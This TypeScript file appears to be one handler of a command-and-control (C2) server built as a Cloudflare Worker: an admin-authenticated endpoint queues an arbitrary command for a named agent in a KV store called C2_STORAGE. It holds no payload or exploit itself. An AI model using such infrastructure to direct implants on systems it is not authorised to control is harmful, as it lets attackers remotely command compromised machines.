import { json, error } from "../core/response"
import { requireAdmin } from "../core/auth"
import { Env } from "../types/env"

export async function issueCommand(
  request: Request,
  env: Env
): Promise<Response> {

  const auth = requireAdmin(request, env)
  if (auth) return auth

  let body: { agentId?: string; command?: string }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (!body.agentId || !body.command) {
    return error("Missing fields", 400)
  }

  const commandId = crypto.randomUUID()
  const commandKey = `cmd:${body.agentId}`

  try {
    // Check if command already exists for this agent
    const existing = await env.C2_STORAGE.get(commandKey)
    if (existing) {
      return error("Command already pending for this agent", 409)
    }

    // Store command in KV
    await env.C2_STORAGE.put(
      commandKey,
      JSON.stringify({
        id: commandId,
        command: body.command,
        agentId: body.agentId
      })
    )

    console.log('Command stored:', commandKey, commandId)

    return json({ ok: true, commandId })
  } catch (err) {
    console.error('Error storing command:', err)
    return error("Failed to store command", 500)
  }
}